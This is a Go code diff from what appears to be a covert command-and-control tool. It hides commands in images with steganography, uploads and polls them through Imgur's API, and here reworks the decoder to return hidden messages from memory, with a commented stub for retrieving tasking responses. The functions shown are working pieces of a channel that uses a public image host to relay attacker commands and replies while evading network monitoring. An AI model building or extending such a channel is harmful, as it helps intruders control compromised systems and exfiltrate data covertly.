@@ -10,6 +10,7 @@ import (
 	"mime/multipart"
 	"net/http"
 	"os"
+	"strings"
 
 	stego "github.com/auyer/steganography"
 	"github.com/fatih/color"
@@ -43,6 +44,7 @@ func CreateImage(command string, origPic string, newPic string) {
 func UploadImage(imageFile string, title string, album string, description string, clientID string) (imageID, deleteHash interface{}) {
 	url := "https://api.imgur.com/3/image"
 	method := "POST"
+
 	var params = map[string]string{"image": imageFile, "title": title, "album": album, "description": description}
 
 	payload := &bytes.Buffer{}
@@ -68,6 +70,7 @@ func UploadImage(imageFile string, title string, album string, description strin
 
 	req.Header.Set("Content-Type", writer.FormDataContentType())
 	res, err := client.Do(req)
+
 	var result map[string]interface{}
 
 	json.NewDecoder(res.Body).Decode(&result)
@@ -135,17 +138,24 @@ func GetImage() bool {
 	return result == "Yes"
 }
 
-// DecodeImage is a test function to decode stego
-func DecodeImage() {
-	// If this image doesn't exist it will break
-	inFile, _ := os.Open("/tmp/asdf.jpg")
-	defer inFile.Close()
+// DecodeImage is a function to decode stego
+func DecodeImage(memContents []uint8) (message string) {
 
-	reader := bufio.NewReader(inFile)
+	inFile := string(memContents)
+	reader := strings.NewReader(inFile)
 	img, _ := png.Decode(reader)
 
 	sizeOfMessage := stego.GetMessageSizeFromImage(img)
 
+	// Probably should clean this up, but this works for now
 	msg := stego.Decode(sizeOfMessage, img)
-	fmt.Println(string(msg))
+	//fmt.Println(string(msg))
+	message = string(msg)
+	return message
 }
+
+// GetResponse is a function for the tasking module to retrieve response
+//func GetResponse(albumID string, clientID string) (out string) {
+// If ImageTitle contains Response, start decoding, if not ignore
+
+//}
